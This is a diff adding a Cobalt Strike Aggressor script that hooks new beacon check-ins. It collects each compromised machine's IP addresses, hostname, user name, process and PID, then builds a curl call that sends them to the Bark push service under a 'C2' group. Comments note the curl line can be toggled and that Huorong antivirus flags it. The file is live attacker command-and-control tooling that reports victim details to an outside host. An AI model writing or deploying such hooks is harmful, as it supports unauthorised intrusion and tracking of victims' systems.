@@ -1,0 +1,16 @@
+# iOS Bark通知
+on beacon_initial {
+    $bark_key = "https://api.day.app/***********************/";
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $process = replace(beacon_info($1,"process")," ","_");
+    $pid = replace(beacon_info($1,"pid")," ","_");
+    $message = 'external:%20' .$externalIP .'%0d%0a' .'internal:%20' .$internalIP .'%0d%0a' .'username:%20' .$userName .'%0d%0a' .'computer:%20' .$computerName .'%0d%0a' .'process:%20' .$process .'(' .$pid .')';
+    # @curl_command = ("curl $bark_key $+ New%20host%20online/ $+ $message $+ /?group=C2");
+    exec(@curl_command);    # 可在服务端改为加密推送：https://bark.day.app/#/encryption
+}
+
+# 不用时将 @curl_command 注释掉，否则每次上线时火绒都会提示curl下载文件!!!
+# 其他相关项目：https://github.com/nickvourd/CS-Aggressor-Kit/tree/main
